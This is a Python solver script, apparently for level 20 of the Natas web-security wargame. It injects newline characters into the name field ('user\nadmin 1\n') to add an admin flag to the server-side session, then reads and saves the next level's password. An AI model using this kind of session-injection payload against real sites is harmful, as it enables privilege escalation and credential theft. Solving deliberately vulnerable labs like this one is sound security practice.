"""
serialized data injection
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 20

def solve(url: str, login: LevelLogin) -> Optional[str]:
    with requests.session() as session:
        session.auth = login
        response = session.get(url)
        response.raise_for_status()

        # inject admin key:value via name change function
        response = session.post(f"{url}/index.php", data={"name": "user\nadmin 1\n"})
        response.raise_for_status()

        # get the main page again to receive creds because session is now admin
        response = session.get(url)
        response.raise_for_status()

    candidate_passwords = extract_candidate_passwords(response.text)

    return try_level_login(LEVEL + 1, candidate_passwords)

    return None

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))